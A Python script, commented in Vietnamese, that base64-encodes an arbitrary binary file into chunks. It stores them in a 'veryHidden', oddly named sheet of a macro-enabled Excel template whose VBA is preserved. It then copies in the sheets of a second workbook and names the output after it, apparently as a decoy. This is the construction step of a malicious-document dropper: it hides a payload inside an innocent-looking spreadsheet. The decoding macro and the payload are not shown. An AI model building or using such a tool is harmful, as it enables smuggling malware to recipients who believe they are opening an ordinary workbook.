import base64
import os
from openpyxl import load_workbook

EXCEL_CELL_LIMIT = 32767

import os
import pythoncom
import win32com.client as win32

def sheet_exists(wb, sheet_name):
    try:
        wb.Worksheets(sheet_name)
        return True
    except Exception:
        return False

def copy_all_sheets_from_file2_to_file1(file1, file2):
    file1 = os.path.abspath(file1)
    file2 = os.path.abspath(file2)

    pythoncom.CoInitialize()

    excel = win32.DispatchEx("Excel.Application")
    excel.Visible = False
    excel.DisplayAlerts = False
    excel.AskToUpdateLinks = False

    wb1 = None
    wb2 = None

    try:
        wb1 = excel.Workbooks.Open(file1, UpdateLinks=0, ReadOnly=False)
        wb2 = excel.Workbooks.Open(file2, UpdateLinks=0, ReadOnly=True)

        if wb1.ReadOnly:
            raise RuntimeError("File đích đang ReadOnly. Hãy đóng out.xlsm rồi chạy lại.")

        before_count = wb1.Worksheets.Count
        source_count = wb2.Worksheets.Count

        print(f"[+] File 1 sheets before: {before_count}")
        print(f"[+] File 2 sheets to copy: {source_count}")

        for i in range(1, source_count + 1):
            ws = wb2.Worksheets(i)
            print(f"[+] Copy sheet: {ws.Name}")

            # QUAN TRỌNG:
            # Copy(Before, After)
            # Không dùng ws.Copy(After=...)
            ws.Copy(None, wb1.Worksheets(wb1.Worksheets.Count))

            print(f"    -> File 1 sheets now: {wb1.Worksheets.Count}")

        after_count = wb1.Worksheets.Count
        print(f"[+] File 1 sheets after: {after_count}")

        if after_count <= before_count:
            raise RuntimeError("Không có sheet nào được copy vào file 1.")

        # Lưu lại file xlsm
        # Xoá sheet mặc định nếu còn
        excel.DisplayAlerts = False

        if sheet_exists(wb1, "Sheet1") and wb1.Worksheets.Count > 1:
            wb1.Worksheets("Sheet1").Delete()
            print("[+] Deleted default sheet: Sheet1")

        # Lưu lại file xlsm
        wb1.Save()

        print("[+] Saved:", file1)

    finally:
        if wb2 is not None:
            wb2.Close(SaveChanges=False)

        if wb1 is not None:
            wb1.Close(SaveChanges=False)

        excel.Quit()
        pythoncom.CoUninitialize()

def chunk_string(s: str, chunk_size: int) -> list[str]:
    return [s[i:i + chunk_size] for i in range(0, len(s), chunk_size)]

def file_to_xlsm_base64_chunks(input_file: str, template_xlsm: str, output_xlsm: str, chunk_size: int = 30000):
    if chunk_size >= EXCEL_CELL_LIMIT:
        raise ValueError("chunk_size phải < 32767")
    if not output_xlsm.lower().endswith(".xlsm"):
        raise ValueError("output_xlsm phải là .xlsm")
    if not os.path.exists(template_xlsm):
        raise FileNotFoundError(f"Không thấy template: {template_xlsm}")

    with open(input_file, "rb") as f:
        raw = f.read()

    b64 = base64.b64encode(raw).decode("ascii")
    parts = chunk_string(b64, chunk_size)

    # Load template xlsm và GIỮ VBA structure
    wb = load_workbook(template_xlsm, keep_vba=True)

    ws2 = wb.create_sheet(title="Vxbzzx")

    # Lấy/ tạo Sheet1
    if "Vxbzzx" in wb.sheetnames:
        ws = wb["Vxbzzx"]
        ws.delete_rows(1, ws.max_row)  # xoá data cũ (nếu có)
    else:
        ws = wb.active
        ws.title = "Vxbzzx"

    # Ghi chunks vào cột A từ A1
    for i, p in enumerate(parts, start=1):
        ws.cell(row=i, column=1, value=p)

    ws.column_dimensions["A"].width = 120
    ws.freeze_panes = "A2"

    if os.path.exists(output_xlsm):
        os.remove(output_xlsm)

    ws.sheet_state = "veryHidden"
    wb.save(output_xlsm)
    wb.close()
    return output_xlsm

if __name__ == "__main__":
    # python script.py input.bin template.xlsm template2.xlsx
    import sys
    if len(sys.argv) != 4:
        print("Usage: python script.py <input_file> <template.xlsm> <template2.xlsx>")
        raise SystemExit(1)

    input_file = sys.argv[1]
    template_xlsm = sys.argv[2]
    template2 = sys.argv[3]

    base = os.path.splitext(os.path.basename(template2))[0]
    output_dir = "output"
    os.makedirs(output_dir, exist_ok=True)
    output_xlsm = os.path.join(output_dir, base + ".xlsm")

    file_to_xlsm_base64_chunks(input_file, template_xlsm, output_xlsm, chunk_size=30000)
    copy_all_sheets_from_file2_to_file1(output_xlsm, template2)
    print("Done. Saved:", output_xlsm)